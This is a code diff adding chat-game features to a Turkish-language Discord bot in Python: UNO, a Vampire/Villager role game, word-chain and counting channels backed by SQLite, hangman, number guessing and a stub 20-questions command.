+      o.id: [deste.pop(), deste.pop(), deste.pop(), deste.pop(), deste.pop()]
+      for o in oyuncular
+  }
+  ustteki_kart = deste.pop()
+
+  class UnoOyunView(discord.ui.View):
+
+    def __init__(self):
+      super().__init__(timeout=None)
+      self.siradaki = 0
+
+    def embed_olustur(self):
+      sira_kisi = oyuncular[self.siradaki]
+      renk_emo = RENGIN_EMOJISI.get(ustteki_kart[0], '⬜')
+      desc = (
+          f'🔔 **SIRA Sende:** {sira_kisi.mention}\n\n'
+          f'🎯 **Masadaki Kart:** {renk_emo} **{ustteki_kart[1]} {ustteki_kart[0]}**\n\n'
+          '📊 **Oyuncu Kart Sayıları:**\n'
+      )
+      for o in oyuncular:
+        k_sayi = len(kartlar[o.id])
+        uno_str = ' ⚠️ **UNO!**' if k_sayi == 1 else ''
+        desc += f'• {o.name} → **{k_sayi} Kart**{uno_str}\n'
+
+      return discord.Embed(
+          title='🎴 UNO MASASI',
+          description=desc,
+          color=discord.Color.green(),
+      )
+
+    @discord.ui.button(
+        label='Kartlarımı Gör / Hamle Yap',
+        style=discord.ButtonStyle.primary,
+        emoji='👁️',
+    )
+    async def hamle_yap(
+        self, interaction: discord.Interaction, button: discord.ui.Button
+    ):
+      aktif_oyuncu = oyuncular[self.siradaki]
+      if interaction.user.id != aktif_oyuncu.id:
+        await interaction.response.send_message(
+            '❌ Sıra sende değil!', ephemeral=True
+        )
+        return
+
+      k_listesi = kartlar[interaction.user.id]
+
+      secenekler = []
+      for i, k in enumerate(k_listesi):
+        secenekler.append(
+            discord.SelectOption(
+                label=f'{i+1}. Kart: {k[1]} {k[0]}',
+                value=str(i),
+                emoji=RENGIN_EMOJISI.get(k[0], '⬜'),
+            )
+        )
+
+      class KartSecimSelect(discord.ui.Select):
+
+        def __init__(self, parent_view, k_list, o_listesi, oyuncu_obj):
+          nonlocal ustteki_kart
+          self.p_view = parent_view
+          self.k_list = k_list
+          self.o_listesi = o_listesi
+          self.oyuncu_obj = oyuncu_obj
+          super().__init__(
+              placeholder='Yere atmak istediğin kartı seç...',
+              options=secenekler,
+          )
+
+        async def callback(self, inter: discord.Interaction):
+          nonlocal ustteki_kart
+          idx = int(self.values[0])
+          if idx >= len(self.k_list):
+            await inter.response.send_message(
+                '❌ Geçersiz kart seçimi!', ephemeral=True
+            )
+            return
+
+          atilan = self.k_list[idx]
+
+          if atilan[0] == ustteki_kart[0] or atilan[1] == ustteki_kart[1]:
+            self.k_list.pop(idx)
+            ustteki_kart = atilan
+
+            if len(self.k_list) == 0:
+              await inter.response.send_message(
+                  f'🏆 **OYUN BİTTİ! KAZANAN:** {inter.user.mention} 👑',
+                  ephemeral=False,
+              )
+              return
+
+            self.p_view.siradaki = (self.p_view.siradaki + 1) % len(
+                self.o_listesi
+            )
+            try:
+              await interaction.message.edit(
+                  embed=self.p_view.embed_olustur(), view=self.p_view
+              )
+            except Exception:
+              pass
+
+            await inter.response.send_message(
+                f'✅ Atılan Kart: {RENGIN_EMOJISI.get(atilan[0], "⬜")} **{atilan[1]} {atilan[0]}**',
+                ephemeral=True,
+            )
+          else:
+            await inter.response.send_message(
+                '❌ Bu kart masadaki karta uymuyor! Kart çekmelisin.',
+                ephemeral=True,
+            )
+
+      class KartSecimView(discord.ui.View):
+
+        def __init__(self):
+          super().__init__(timeout=30)
+          self.add_item(
+              KartSecimSelect(view, k_listesi, oyuncular, interaction.user)
+          )
+
+        @discord.ui.button(
+            label='Kart Çek (+1)',
+            style=discord.ButtonStyle.secondary,
+            emoji='📥',
+        )
+        async def kart_cek(
+            self, inter_btn: discord.Interaction, btn: discord.ui.Button
+        ):
+          nonlocal deste
+          if len(deste) == 0:
+            deste = destaOlustur()
+          cekilen = deste.pop()
+          k_listesi.append(cekilen)
+          emo = RENGIN_EMOJISI.get(cekilen[0], '⬜')
+          await inter_btn.response.send_message(
+              f'📥 Desteden Kart Çektin: {emo} **{cekilen[1]} {cekilen[0]}**',
+              ephemeral=True,
+          )
+
+      await interaction.response.send_message(
+          '🎴 **Elindeki Kartlar:** Uygun kartını seçebilir veya kart'
+          ' çekebilirsin.',
+          view=KartSecimView(),
+          ephemeral=True,
+      )
+
+  view = UnoOyunView()
+  await channel.send(
+      '🟢 **UNO Oyunu Başladı!** Masa kuruldu.',
+      embed=view.embed_olustur(),
+      view=view,
+  )
+
+
+@bot.command(name='unobaşlat')
+@commands.check(kurucu_mu)
+async def unobaslat(ctx):
+  view = UnoKatilimView()
+  await ctx.send(
+      '🎴 **UNO Oyunu Katılım Başladı!**\nEn az 4, en fazla 5 kişi olabilir.'
+      ' Katılmak için aşağıdaki butona basın.',
+      view=view,
+  )
+
+
+# ================= VAMPİR KÖYLÜ SİSTEMİ =================
+
+
+class VampirKatilimView(discord.ui.View):
+
+  def __init__(self):
+    super().__init__(timeout=60)
+    self.katilanlar = []
+
+  @discord.ui.button(
+      label='Vampir Köylüye Katıl (0/15)',
+      style=discord.ButtonStyle.danger,
+      emoji='🧛‍♂️',
+  )
+  async def katil_btn(
+      self, interaction: discord.Interaction, button: discord.ui.Button
+  ):
+    if interaction.user in self.katilanlar:
+      await interaction.response.send_message(
+          'Zaten katıldın!', ephemeral=True
+      )
+      return
+
+    self.katilanlar.append(interaction.user)
+    button.label = f'Vampir Köylüye Katıl ({len(self.katilanlar)}/15)'
+
+    if len(self.katilanlar) == 15:
+      for child in self.children:
+        child.disabled = True
+      await interaction.message.edit(view=self)
+      self.stop()
+      await vampir_oyunu_baslat(interaction.channel, self.katilanlar)
+      return
+
+    await interaction.message.edit(view=self)
+    await interaction.response.send_message(
+        'Oyuna başarıyla katıldın!', ephemeral=True
+    )
+
+  @discord.ui.button(
+      label='Oyunu Başlat (Min 5)', style=discord.ButtonStyle.primary, emoji='▶️'
+  )
+  async def baslat_btn(
+      self, interaction: discord.Interaction, button: discord.ui.Button
+  ):
+    if len(self.katilanlar) < 5:
+      await interaction.response.send_message(
+          '❌ Oyunu başlatmak için en az 5 kişi olmalı!', ephemeral=True
+      )
+      return
+
+    for child in self.children:
+      child.disabled = True
+    await interaction.message.edit(view=self)
+    self.stop()
+    await vampir_oyunu_baslat(interaction.channel, self.katilanlar)
+
+
+async def vampir_oyunu_baslat(channel, oyuncular):
+  roller = ['Vampir', 'Doktor', 'Dedektif', 'Köylü', 'Köylü']
+  while len(roller) < len(oyuncular):
+    roller.append('Köylü')
+
+  random.shuffle(roller)
+  oyuncu_rolleri = {oyuncular[i]: roller[i] for i in range(len(oyuncular))}
+
+  await channel.send(
+      '🧛‍♂️ **Vampir Köylü Oyunu Başladı!**\nRoller oyunculara özel mesaj (DM)'
+      ' olarak gönderildi. Gece vakti başladı!'
+  )
+
+  for oyuncu, rol in oyuncu_rolleri.items():
+    try:
+      if rol == 'Vampir':
+        vampir_view = discord.ui.View()
+        for hedef in oyuncular:
+          if hedef.id != oyuncu.id:
+            btn = discord.ui.Button(
+                label=hedef.name,
+                style=discord.ButtonStyle.danger,
+                emoji='🗡️',
+            )
+
+            async def hedef_sec_cb(inter, h=hedef):
+              await inter.response.send_message(
+                  f'🩸 **KURBAN SEÇİLDİ!**\nBu gece hedefin **{h.name}** olarak'
+                  ' belirlendi. 🦇',
+                  ephemeral=True,
+              )
+
+            btn.callback = hedef_sec_cb
+            vampir_view.add_item(btn)
+
+        await oyuncu.send(
+            '🌙 **Vampir Köylü Oyunu Başladı!**\nGizli Rolün: 🧛‍♂️ **Vampir**'
+            ' 🧛‍♂️\n\nGece oldu! Avlamak istediğin kişiyi seç:',
+            view=vampir_view,
+        )
+
+      elif rol == 'Doktor':
+        doktor_view = discord.ui.View()
+        for hedef in oyuncular:
+          btn = discord.ui.Button(
+              label=hedef.name, style=discord.ButtonStyle.success, emoji='💉'
+          )
+
+          async def koru_sec_cb(inter, h=hedef):
+            await inter.response.send_message(
+                f'💉 **KORUMA SAĞLANDI!**\nBu gece koruduğun kişi: **{h.name}**'
+                ' 🩺',
+                ephemeral=True,
+            )
+
+          btn.callback = koru_sec_cb
+          doktor_view.add_item(btn)
+
+        await oyuncu.send(
+            '🌙 **Vampir Köylü Oyunu Başladı!**\nGizli Rolün: 💉 **Doktor**'
+            ' 💉\n\nGece oldu! Korumak istediğin kişiyi seç:',
+            view=doktor_view,
+        )
+      else:
+        await oyuncu.send(
+            f'🌙 **Vampir Köylü Oyunu Başladı!**\nGizli Rolün: **{rol}**\nGece'
+            ' vakti, sabahı bekle...'
+        )
+    except Exception:
+      pass
+
+
+@bot.command(name='vampirköylü')
+@commands.check(kurucu_mu)
+async def vampirkoylu(ctx):
+  view = VampirKatilimView()
+  await ctx.send(
+      '🧛‍♂️ **Vampir Köylü Katılım Başladı!**\nEn az 5, en fazla 15 kişi'
+      ' olmalıdır. Katılmak için aşağıdaki butona basın.',
+      view=view,
+  )
+
+
+# ================= DİĞER OYUN SİSTEMLERİ =================
+
+# 1. Kelime Oyunu Sistemi
+@bot.command(name='kelimebaşlat')
+@commands.check(kurucu_mu)
+async def kelime_baslat(ctx, kanal: discord.TextChannel):
+  cursor.execute(
+      'INSERT INTO oyun_kanallari (guild_id, kelime_kanal_id, son_kelime)'
+      ' VALUES (?, ?, ? ) ON CONFLICT(guild_id) DO UPDATE SET'
+      ' kelime_kanal_id = ?',
+      (ctx.guild.id, kanal.id, '', kanal.id),
+  )
+  db.commit()
+  await ctx.send(
+      f'✅ Kelime oyunu kanalı başarıyla {kanal.mention} olarak ayarlandı.'
+  )
+
+
+# 2. Saymaca Sistemi
+@bot.command(name='saymacaşlat')
+@commands.check(kurucu_mu)
+async def saymaca_baslat(ctx, kanal: discord.TextChannel):
+  cursor.execute(
+      'INSERT INTO oyun_kanallari (guild_id, saymaca_kanal_id, saymaca_sayi,'
+      ' saymaca_son_yazan) VALUES (?, ?, 0, 0) ON CONFLICT(guild_id) DO UPDATE'
+      ' SET saymaca_kanal_id = ?, saymaca_sayi = 0, saymaca_son_yazan = 0',
+      (ctx.guild.id, kanal.id, kanal.id),
+  )
+  db.commit()
+  await ctx.send(
+      f'✅ Saymaca oyunu kanalı başarıyla {kanal.mention} olarak ayarlandı.'
+  )
+
+
+# 3. Adam Asmaca Oyunu
+KELİMELER = [
+    'discord',
+    'python',
+    'bilgisayar',
+    'yazilim',
+    'oyun',
+    'sunucu',
+    'klavye',
+    'maceraci',
+]
+
+
+class AdamAsmacaView(discord.ui.View):
+
+  def __init__(self, kelime):
+    super().__init__(timeout=120)
+    self.kelime = kelime
+    self.dogru_tahminler = set()
+    self.yanlis_hak = 6
+
+  def get_display(self):
+    return ' '.join(
+        [c if c in self.dogru_tahminler else '_' for c in self.kelime]
+    )
+
+  @discord.ui.button(
+      label='Harf Tahmin Et', style=discord.ButtonStyle.primary, emoji='🔤'
+  )
+  async def harf_sec(
+      self, interaction: discord.Interaction, button: discord.ui.Button
+  ):
+
+    class HarfModal(discord.ui.Modal, title='Adam Asmaca - Harf Gir'):
+      harf = discord.ui.TextInput(label='Bir harf girin', max_length=1)
+
+      async def on_submit(self, inter: discord.Interaction):
+        h = self.harf.value.lower()
+        if len(h) != 1 or not h.isalpha():
+          await inter.response.send_message(
+              '❌ Lütfen geçerli bir tek harf girin!', ephemeral=True
+          )
+          return
+
+        view = self.view_ref
+        if h in view.kelime:
+          view.dogru_tahminler.add(h)
+          if all(c in view.dogru_tahminler for c in view.kelime):
+            for child in view.children:
+              child.disabled = True
+            await inter.message.edit(
+                content=(
+                    '🎉 **Tebrikler! Kelimeyi bildiniz:**'
+                    f' `{view.kelime}`'
+                ),
+                view=view,
+            )
+            await inter.response.send_message(
+                '🏆 Oyunu kazandınız!', ephemeral=True
+            )
+            return
+
+          await inter.response.send_message(
+              f'✅ Doğru harf: **{h}**', ephemeral=True
+          )
+        else:
+          view.yanlis_hak -= 1
+          if view.yanlis_hak <= 0:
+            for child in view.children:
+              child.disabled = True
+            await inter.message.edit(
+                content=f'💀 **Kaybettiniz! Kelime şuydu:** `{view.kelime}`',
+                view=view,
+            )
+            await inter.response.send_message(
+                '❌ Haklarınız bitti.', ephemeral=True
+            )
+            return
+          await inter.response.send_message(
+              f'❌ Yanlış harf! Kalan hak: {view.yanlis_hak}', ephemeral=True
+          )
+
+        embed = discord.Embed(
+            title='🎯 Adam Asmaca Oyunu',
+            description=(
+                f'Kelime: `{view.get_display()}`\nKalan Yanlış Hakkı:'
+                f' **{view.yanlis_hak}/6**'
+            ),
+            color=discord.Color.orange(),
+        )
+        await inter.message.edit(embed=embed, view=view)
+
+    modal = HarfModal()
+    modal.view_ref = self
+    await interaction.response.send_modal(modal)
+
+
+@bot.command(name='adamasmaca')
+async def adamasmaca(ctx):
+  secilen_kelime = random.choice(KELİMELER)
+  view = AdamAsmacaView(secilen_kelime)
+  embed = discord.Embed(
+      title='🎯 Adam Asmaca Oyunu Başladı!',
+      description=f'Kelime: `{view.get_display()}`\nKalan Yanlış Hakkı: **6/6**',
+      color=discord.Color.orange(),
+  )
+  await ctx.send(embed=embed, view=view)
+
+
+# 4. Yüksek / Alçak (Sayı Tahmin) Oyunu
+@bot.command(name='tahminbaşlat')
+@commands.check(kurucu_mu)
+async def tahmin_baslat(ctx):
+  hedef_sayi = random.randint(1, 100)
+  await ctx.send(
+      '🎯 **1 ile 100 Arası Sayı Tahmin Oyunu Başladı!**\nSohbete 1-100 arasında'
+      ' bir sayı yazarak tahmin edin.'
+  )
+
+  def check(m):
+    return (
+        m.channel == ctx.channel and not m.author.bot and m.content.isdigit()
+    )
+
+  for _ in range(15):
+    try:
+      msg = await bot.wait_for('message', timeout=30.0, check=check)
+      tahmin = int(msg.content)
+      if tahmin == hedef_sayi:
+        await ctx.send(
+            f'🎉 Tebrikler {msg.author.mention}, doğru tahmin! Sayı'
+            f' **{hedef_sayi}** idi.'
+        )
+        return
+      elif tahmin < hedef_sayi:
+        await ctx.send(
+            f'📈 Daha **yüksek** bir sayı söyle! ({msg.author.name})'
+        )
+      else:
+        await ctx.send(f'📉 Daha **alçak** bir sayı söyle! ({msg.author.name})')
+    except asyncio.TimeoutError:
+      await ctx.send(
+          f'⏰ Süre bitti! Kimse bilemedi. Doğru sayı **{hedef_sayi}** idi.'
+      )
+      return
+
+
+# 5. 20 Soru / Nesne Tahmin Oyunu
+@bot.command(name='20sorubaşlat')
+@commands.check(kurucu_mu)
+async def yirmi_soru_baslat(ctx):
+  nesneler = [
+      'Elma',
+      'Bilgisayar',
+      'Gözlük',
+      'Araba',
+      'Kalem',
+      'Telefon',
+      'Kitap',
+      'Gitar',
+  ]
+  secilen = random.choice(nesneler)
+  await ctx.send(
+      '🧠 **20 Soru / Nesne Tahmin Oyunu Başladı!**\nAklımdan bir nesne tuttum.'
+      ' Sadece **"Evet"** veya **"Hayır"** cevabı alabileceğiniz sorular'
+      ' sorun veya direkt tahmin edin!'
+  )
+
+
+# Mesaj Dinleyicisi
+@bot.event
+async def on_message(message):
+  if message.author.bot:
+    return
+
+  await bot.process_commands(message)
+
+  cursor.execute(
+      'SELECT kelime_kanal_id, saymaca_kanal_id, saymaca_sayi, saymaca_son_yazan,'
+      ' son_kelime FROM oyun_kanallari WHERE guild_id = ?',
+      (message.guild.id,),
+  )
+  res = cursor.fetchone()
+
+  if res:
+    kelime_kanal, saymaca_kanal, saymaca_sayisi, saymaca_son, son_kel = res
+
+    # Kelime Oyunu Mantığı
+    if kelime_kanal and message.channel.id == kelime_kanal:
+      kelime = message.content.strip().lower()
+      if ' ' in kelime or not kelime.isalpha():
+        return
+      if son_kel and kelime[0] != son_kel[-1]:
+        await message.add_reaction('❌')
+        return
+
+      cursor.execute(
+          'UPDATE oyun_kanallari SET son_kelime = ? WHERE guild_id = ?',
+          (kelime, message.guild.id),
+      )
+      db.commit()
+      await message.add_reaction('✅')
+
+    # Saymaca Oyunu Mantığı
+    elif saymaca_kanal and message.channel.id == saymaca_kanal:
+      if message.content.isdigit():
+        sayi = int(message.content)
+        if message.author.id == saymaca_son:
+          await message.delete()
+          return
+        if sayi == saymaca_sayisi + 1:
+          cursor.execute(
+              'UPDATE oyun_kanallari SET saymaca_sayi = ?, saymaca_son_yazan ='
+              ' ? WHERE guild_id = ?',
+              (sayi, message.author.id, message.guild.id),
+          )
+          db.commit()
+          await message.add_reaction('👍')
+        else:
+          await message.delete()
+
+
+bot.run('TOKENINIZI_BURAYA_YAZIN')
